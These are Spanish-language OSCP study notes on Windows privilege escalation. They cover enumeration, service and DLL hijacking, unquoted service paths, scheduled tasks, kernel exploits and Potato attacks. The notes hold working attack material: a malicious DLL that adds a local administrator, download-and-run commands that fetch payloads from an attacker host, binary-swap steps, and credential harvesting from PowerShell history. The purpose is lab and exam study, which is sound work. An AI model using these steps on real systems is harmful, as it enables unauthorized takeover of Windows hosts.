---
tipo: modulo
modulo: 17
estado: repasado
tags:
  - oscp
  - privesc
  - windows
fecha: 2026-10-08
---

# 17 - Windows Privilege Escalation

> [!abstract] Resumen
> Tras un foothold como usuario sin privilegios en Windows, buscar vías para llegar a **admin local / SYSTEM**.
> - **17.1 Enumerar Windows**: situational awareness (user/groups/SO/red/apps/procesos), buscar info sensible a mano (archivos, carpetas de usuario, configs de apps) y en artefactos de **PowerShell** (historial PSReadline, transcripts), y enumeración automatizada con **winPEAS**.
> - **17.2 Abusar de servicios de Windows**: **Service Binary Hijacking** (reemplazar el .exe de un servicio con permisos débiles), **DLL Hijacking** (colocar una DLL maliciosa donde la busca una app por el *DLL search order*), **Unquoted Service Paths** (rutas de servicio sin comillas con espacios → colocar un .exe en una carpeta intermedia).
> - **17.3 Otros componentes**: **Scheduled Tasks** con binario reemplazable, y **exploits** (de aplicación, de kernel, y abuso de `SeImpersonatePrivilege` con herramientas "Potato" vía named pipes).
> Idea clave del examen: primero enumerar a fondo (manual + winPEAS/PowerUp), nunca fiarse ciegamente de los automatizados, y priorizar vectores con `(F)`/`(M)` en `icacls` antes que exploits de kernel (más ruidosos e inestables).

## Conceptos clave
- **SID** (`S-R-X-Y`): identifica principals (usuarios/grupos). Windows controla accesos por SID, no por nombre. RID < 1000 = **well-known SID** (genéricos); RID ≥ 1000 = cuentas normales.
- **Access token**: se genera al hacer login y contiene el SID del user + SIDs de sus grupos + privilegios. **Primary token** = el del proceso/hilo que lo lanza; **impersonation token** = permite a un hilo actuar temporalmente con el contexto de otro user (clave para los ataques "Potato").
- **Mandatory Integrity Control (MIC)**: niveles de integridad (System > High > Medium > Low > Untrusted). Un proceso solo puede modificar objetos de integridad igual o inferior, aunque el user sea admin.
- **UAC**: un admin que inicia sesión normal recibe un **filtered admin token** (integridad Medium); solo al elevar ("Ejecutar como administrador", prompt UAC) obtiene el token completo (High). Pertenecer a Administrators no basta si el proceso corre en Medium.
- **Situational awareness**: lo primero tras el foothold. Reunir: user/hostname, grupos del user actual, users/grupos existentes, SO/versión/arquitectura, red (ipconfig, rutas, netstat), apps instaladas, procesos corriendo. Nombres con "admin" o grupos no estándar con descripción propia son pistas de alto valor.
- **Fuentes de info sensible**: archivos sueltos en Desktop/Documents de los users, configs de apps instaladas (ej. XAMPP `my.ini`), bases de gestores de contraseñas (`*.kdbx`). Cambiar de usuario (RDP, `runas`) abre acceso a ficheros antes denegados.
- **Artefactos de PowerShell**: `Get-History` solo cubre la sesión actual y `Clear-History` no borra el histórico real; el fichero persistente de **PSReadline** (`(Get-PSReadlineOption).HistorySavePath`) sí sobrevive. **PowerShell Transcription** (`Start-Transcript`) deja ficheros de texto con toda la sesión si algún admin la activó.
- **winPEAS**: script de enumeración automatizada (PEASS-ng) que vuelca casi toda la situational awareness en un único output coloreado. Útil para no perder tiempo, pero complementa — no sustituye — la revisión manual (puede fallar en detectar cosas, p. ej. la versión de SO o ficheros sueltos).
- **Permisos de servicio con `icacls`**: hay que distinguir permisos sobre el **binario del servicio** (`.exe`) de los permisos para **start/stop** el servicio. `(F)` = Full access, `(M)` = Modify, `(RX)` = Read&Execute. Si el user tiene `(F)`/`(M)` sobre el `.exe` de un servicio que arranca como **LocalSystem**, se puede sustituir el binario.
- **DLL search order**: cuando un proceso carga una DLL sin ruta absoluta, Windows busca primero en el **directorio de la app**, luego en directorios de sistema, y la carpeta actual tiene prioridad baja. Si a una app le falta una DLL (buscada y no encontrada), se puede colocar una DLL maliciosa con ese nombre en el directorio de la app.
- **Unquoted Service Path**: si la ruta del binario de un servicio tiene espacios y no va entre comillas, `CreateProcess` prueba a ejecutar cada sub-ruta terminada en `.exe` de izquierda a derecha. Colocar un ejecutable con el nombre de una de esas sub-rutas en una carpeta intermedia escribible = se ejecuta en vez del binario legítimo.
- **Scheduled Tasks**: para privesc interesan tres datos — el **principal** (usuario que lo ejecuta, idealmente SYSTEM/admin), el **trigger** (cuándo se dispara) y la **action** (qué binario ejecuta). Si el binario es escribible por el user actual, se puede sustituir.
- **Exploits**: de **aplicación** (software de terceros con versión vulnerable) o de **kernel** (afectan al propio Windows). Los de kernel suelen dar SYSTEM directo pero son más ruidosos e inestables (pueden colgar el sistema) — comprobar siempre qué parches (`KB`) tiene instalados el objetivo.
- **`SeImpersonatePrivilege` y ataques "Potato"**: privilegio habitual en cuentas de servicio (IIS, SQL Server, cuentas `LocalService`/`NetworkService`/`ApplicationPoolIdentity`). Permite impersonar a un cliente que se conecta a un **named pipe** tras autenticarse. Herramientas tipo *Potato* (RottenPotato, JuicyPotato, SweetPotato, GodPotato, SigmaPotato) fuerzan a un servicio SYSTEM a conectarse a un pipe controlado por el atacante para heredar ese contexto.

> [!tip] Idea para el examen
> Orden de ataque recomendado: **situational awareness manual** → revisar PowerShell history/transcripts → **winPEAS** (contraste, no sustituye lo manual) → si hay servicios con `(F)`/`(M)` en `icacls` sobre el binario → **Service Binary Hijacking**; si no, mirar **Unquoted Service Paths** y **DLL Hijacking** (con Process Monitor si hace falta); revisar **Scheduled Tasks** con binario escribible; si nada de esto cuaja, buscar **exploit de aplicación/kernel** acorde a versión y parches, y comprobar `whoami /priv` para `SeImpersonatePrivilege` → **Potato**. Para reiniciar un servicio sin permiso de `net stop`, comprobar `whoami /priv` → `SeShutdownPrivilege` → `shutdown /r /t 0` (solo si el servicio tiene Startup Type `Auto`).

---

## 17.1 Enumerar Windows

### Situational awareness manual
```powershell
whoami                      # user + hostname
whoami /groups               # grupos del user actual
Get-LocalUser                 # users locales
Get-LocalGroup                 # grupos locales (buscar grupos no estándar)
Get-LocalGroupMember <grupo>    # miembros de un grupo (ej. Administrators)
systeminfo                       # SO, versión, build, arquitectura
ipconfig /all                     # interfaces de red
route print                        # tabla de rutas
netstat -ano                        # conexiones activas + PID
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process                          # procesos en ejecución
whoami /priv                          # privilegios del token actual
```
| Flag / parte | Qué hace |
|---|---|
| `whoami /groups` | Lista grupos y SIDs del user actual |
| `Get-ItemProperty ...Uninstall\*` | Lee la clave del registro con apps instaladas (32 y 64 bits por separado) |
| `netstat -ano` | `-a` todas las conexiones, `-n` sin resolver nombres, `-o` muestra el PID |
| `whoami /priv` | Privilegios habilitados del token (clave para detectar `SeImpersonatePrivilege`, `SeShutdownPrivilege`...) |

### Buscar información sensible
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue      # bases KeePass
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
type archivo.txt                       # o Get-Content / cat (alias)
net user <usuario>                      # grupos locales de otro user (sin ser admin)
runas /user:<dominio\usuario> cmd        # ejecutar un proceso como otro user (pide su password, requiere GUI)
```
> [!tip] `runas` solo funciona con sesión interactiva/GUI (ej. tras RDP); por consola remota (bind shell) no acepta el prompt de password.

### Artefactos de PowerShell (historial y transcripts)
```powershell
Get-History                                           # historial de la sesión actual (vacío si es shell nueva)
(Get-PSReadlineOption).HistorySavePath                  # ruta del historial persistente de PSReadline
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Si hay credenciales en el historial, reconstruir el objeto PSCredential:
$password = ConvertTo-SecureString "<pwd>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<user>", $password)
Enter-PSSession -ComputerName <host> -Credential $cred      # requiere WinRM / grupo adecuado
```
```bash
evil-winrm -i <ip> -u <user> -p "<password>"         # alternativa desde Kali, más estable que Enter-PSSession
```
> [!tip] Idea para el examen
> `Clear-History` no borra el fichero de PSReadline — sigue siendo legible. Buscar siempre `ConsoleHost_history.txt` y transcripts (`Start-Transcript`, suelen quedar en rutas como `C:\Users\Public\...`) aunque el histórico de la sesión esté vacío.

### Enumeración automatizada (winPEAS)
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```
```powershell
iwr -uri http://<IP_kali>/winPEAS.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
| Flag / parte | Qué hace |
|---|---|
| `iwr` | alias de `Invoke-WebRequest`, descarga el binario al disco |
| winPEAS output | colorea hallazgos por severidad; revisar secciones Users, PS history/transcripts, servicios, tareas programadas, ficheros de passwords |

> [!warning] Errores comunes / cosas que fallan
> - winPEAS puede equivocarse en detalles (p. ej. nombre de versión de SO) o no encontrar todo (ficheros sueltos tipo notas); no sustituye la revisión manual.
> - `runas` no sirve desde una shell no interactiva (bind shell/netcat); hace falta RDP o similar.
> - Fiarse solo del histórico de sesión (`Get-History`) sin mirar el fichero persistente de PSReadline.

---

## 17.2 Abusar de servicios de Windows

### Service Binary Hijacking
Ver nota → [[Service Binary Hijacking]].
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\ruta\al\servicio.exe"                          # comprobar permisos sobre el binario
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<servicio>'}
whoami /priv                                                 # ver si hay SeShutdownPrivilege
shutdown /r /t 0                                              # reiniciar si no se puede net stop/Start-Service
```
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe              # cross-compilar el binario malicioso (crea user admin)
```
```powershell
iwr -uri http://<IP_kali>/adduser.exe -Outfile adduser.exe
move C:\ruta\servicio.exe servicio.exe.bak                    # backup del binario original
move .\adduser.exe C:\ruta\servicio.exe                        # sustituir
# reiniciar servicio (net stop/start, Start-Service, o reboot) y comprobar:
Get-LocalGroupMember administrators
```
Automatizado con **PowerUp.ps1**:
```powershell
iwr -uri http://<IP_kali>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile          # servicios cuyo binario es modificable por el user actual
Install-ServiceBinary -Name '<servicio>'    # AbuseFunction: no siempre funciona con argumentos extra en el PathName
```

### DLL Hijacking
Ver nota → [[DLL Hijacking]].
```powershell
echo "test" > 'C:\ruta\app\test.txt'          # comprobar si se puede escribir en el directorio de la app
```
Con **Process Monitor** (requiere privilegios, o como otro user vía `runas`): filtrar por `Process Name` = binario de la app, operación `CreateFile`, y buscar resultados `NAME NOT FOUND` sobre una DLL concreta → confirma qué DLL falta y dónde la busca primero.
```cpp
// DLL mínima en C++ que ejecuta un comando al cargarse (DLL_PROCESS_ATTACH)
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user <user2> <pwd> /add");
            system("net localgroup administrators <user2> /add");
            break;
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc dll.cpp --shared -o dll_name.dll        # --shared en vez de compilar a .exe
```
```powershell
iwr -uri http://<IP_kali>/dll_name.dll -OutFile 'C:\ruta\app\dll_name.dll'
# esperar a que un admin/proceso privilegiado relance la app, o forzarlo si es un servicio
```

### Unquoted Service Paths
Ver nota → [[Unquoted Service Paths]].
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName    # buscar rutas con espacios y sin comillas
```
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
```
```powershell
Start-Service <servicio>          # comprobar si el user puede arrancar/parar el servicio sin ser admin
Stop-Service <servicio>
icacls "C:\carpeta\intermedia"     # buscar la primera carpeta de la ruta con permiso de escritura para el user
```
```powershell
iwr -uri http://<IP_kali>/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\carpeta\intermedia\Current.exe'     # nombre = primer segmento sin espacio tras la carpeta escribible
Start-Service <servicio>                                      # dispara el binario falso en vez del real
```
Con **PowerUp.ps1**:
```powershell
Get-UnquotedService                                             # lista servicios potencialmente vulnerables
Write-ServiceBinary -Name '<servicio>' -Path "C:\carpeta\intermedia\Current.exe"
Restart-Service <servicio>
```

| Técnica | Requisito clave | Herramienta |
|---|---|---|
| Service Binary Hijacking | `(F)`/`(M)` en `icacls` sobre el `.exe` del servicio | adduser.exe / PowerUp `Get-ModifiableServiceFile` |
| DLL Hijacking | Escritura en el directorio de la app + DLL que falta (`NAME NOT FOUND` en Procmon) | DLL cross-compilada con `DllMain` |
| Unquoted Service Path | Ruta con espacios sin comillas + escritura en alguna carpeta intermedia + poder iniciar el servicio | PowerUp `Get-UnquotedService` / `Write-ServiceBinary` |

> [!warning] Errores comunes / cosas que fallan
> - Tener `(F)` sobre el binario no implica poder hacer `net stop`/`Start-Service`; puede requerir reiniciar la máquina (`shutdown /r /t 0`, comprobando antes `SeShutdownPrivilege` y que el Startup Type sea `Auto`).
> - Las `AbuseFunction` de PowerUp pueden fallar si el `PathName` del servicio lleva argumentos extra (regex de `Get-ModifiablePath` no los contempla bien) — no fiarse ciegamente del automatizado.
> - Para unquoted paths, el ejecutable malicioso debe llamarse exactamente como el primer segmento de ruta sin espacio (ej. `Current.exe` para `...\Current Version\...`), no como el binario legítimo.
> - Recordar restaurar el binario original tras la prueba en una máquina real (no solo en el examen/lab).

---

## 17.3 Abusar de otros componentes de Windows

### Scheduled Tasks
Ver nota → [[Scheduled Tasks Privesc]].
```powershell
schtasks /query /fo LIST /v              # lista detallada: Author, TaskName, Task To Run, Run As User, Next Run Time
icacls C:\ruta\al\binario_de_la_tarea.exe       # permisos sobre el binario que ejecuta la tarea
```
```powershell
iwr -Uri http://<IP_kali>/adduser.exe -Outfile binario_de_la_tarea.exe
move .\ruta\binario_de_la_tarea.exe binario_de_la_tarea.exe.bak
move .\binario_de_la_tarea.exe .\ruta\
# esperar al próximo trigger (Next Run Time) y comprobar:
net localgroup administrators
```
Clave: revisar **quién la ejecuta** (idealmente SYSTEM/admin), **cuándo se dispara** y **qué binario corre**; si ese binario está en una carpeta donde el user actual tiene permisos de escritura, sustituirlo.

### Exploits de aplicación y de kernel
```powershell
systeminfo                            # versión/build exactos
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }   # KBs instalados
```
Buscar exploit público para la versión/build concreta (ver módulo [[13 - Locating Public Exploits]]), comprobar qué `KB` lo parchea y confirmar que el target no lo tiene instalado antes de ejecutarlo.
```powershell
.\CVE-XXXX-XXXXX.exe            # ejecutar el exploit de kernel compilado; comprobar whoami antes/después
```
> [!warning] Los exploits de kernel son más potentes (dan SYSTEM directo) pero más ruidosos e inestables — pueden colgar o tumbar el sistema objetivo. Priorizar siempre vectores de configuración (servicios, tasks) antes de recurrir a ellos.

### Abuso de SeImpersonatePrivilege (Potato attacks)
Ver nota → [[Potato Attacks (SeImpersonate)]].
```powershell
whoami /priv          # buscar SeImpersonatePrivilege habilitado (típico en cuentas de servicio: IIS, SQL, LocalService, NetworkService, ApplicationPoolIdentity)
```
```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```
```powershell
iwr -uri http://<IP_kali>/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user <user2> <pwd> /add"
.\SigmaPotato "net localgroup Administrators <user2> /add"
```
Otras variantes según versión de Windows: RottenPotato, JuicyPotato, SweetPotato, GodPotato.

## Comandos
```powershell
# Situational awareness
whoami /groups ; Get-LocalUser ; Get-LocalGroup ; Get-LocalGroupMember <grupo>
systeminfo ; ipconfig /all ; route print ; netstat -ano
Get-Process ; whoami /priv
# Servicios
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode
icacls "<ruta_binario>"
# PowerUp / winPEAS
. .\PowerUp.ps1 ; Get-ModifiableServiceFile ; Get-UnquotedService ; Write-ServiceBinary -Name '<svc>' -Path '<exe>'
.\winPEAS.exe
# Scheduled tasks
schtasks /query /fo LIST /v
```
```bash
# Cross-compilar binario / DLL maliciosos
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
x86_64-w64-mingw32-gcc dll.cpp --shared -o dll_name.dll
```

> [!warning] Errores comunes / cosas que fallan (generales del módulo)
> - Olvidar que `(F)` sobre el binario de un servicio no basta: también hace falta poder reiniciarlo (servicio o máquina).
> - Confundir grupos no estándar con grupos built-in equivalentes (ej. `BackupUsers` ≠ `Backup Operators`).
> - No verificar permisos de escritura reales con `icacls`/`echo > test.txt` antes de intentar un DLL/Service hijack.
> - Lanzar un exploit de kernel sin comprobar antes `systeminfo` + KBs instalados → riesgo de crash o de que no aplique.

## Ejemplo práctico
> [!example] Cadena en CLIENTWK220
> 1. Foothold como `dave` (bind shell) → situational awareness revela grupo `helpdesk`, users `daveadmin`/`BackupAdmin` como admins locales.
> 2. Nota `asdf.txt` en el Desktop de `dave` filtra la password de `steve` → `steve` tiene RDP.
> 3. Con GUI como `steve`, `C:\xampp\mysql\bin\my.ini` revela la password de `backupadmin` → `runas /user:backupadmin cmd`.
> 4. Servicio `mysql` con binario `(F)` para `Users` → Service Binary Hijacking + reboot (`SeShutdownPrivilege`) → nuevo admin local.
> 5. FileZilla con DLL Hijacking (`TextShaping.dll` ausente) → DLL maliciosa en su carpeta → admin al reabrir la app.
> 6. Servicio `GammaService` con ruta sin comillas y carpeta intermedia escribible → `Current.exe` → admin al reiniciar el servicio.
> 7. Tarea programada `CacheCleanup` (autor `daveadmin`) con binario en `Pictures` de `steve` → sustituir → admin al disparo.
> 8. `steve` sin privilegios especiales pero Windows sin parchear → kernel exploit (`CVE-2023-29360`) → SYSTEM directo.
> 9. `dave` con `SeImpersonatePrivilege` habilitado → SigmaPotato → SYSTEM vía named pipe.

## Relacionado
- Técnicas: [[Service Binary Hijacking]] · [[DLL Hijacking]] · [[Unquoted Service Paths]] · [[Scheduled Tasks Privesc]] · [[Potato Attacks (SeImpersonate)]] · [[winPEAS]]
- Cheatsheet: [[Privesc Windows]]
- Módulo previo: [[16 - Password Attacks]]
- Relacionado: [[13 - Locating Public Exploits]] (búsqueda de exploits), [[15 - Antivirus Evasion]] (si AV bloquea los binarios subidos)
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Cuándo merece más la pena un reboot (`SeShutdownPrivilege`) vs esperar a que el admin relance el proceso/tarea manualmente, en términos de sigilo en un examen/assessment real.
> - Repasar con más detalle las variantes de Potato (Rotten/Juicy/Sweet/God) y en qué versión de Windows aplica cada una.
> - Profundizar en cómo detecta Process Monitor el `NAME NOT FOUND` y cómo filtrar más rápido en máquinas con mucho ruido de procesos.
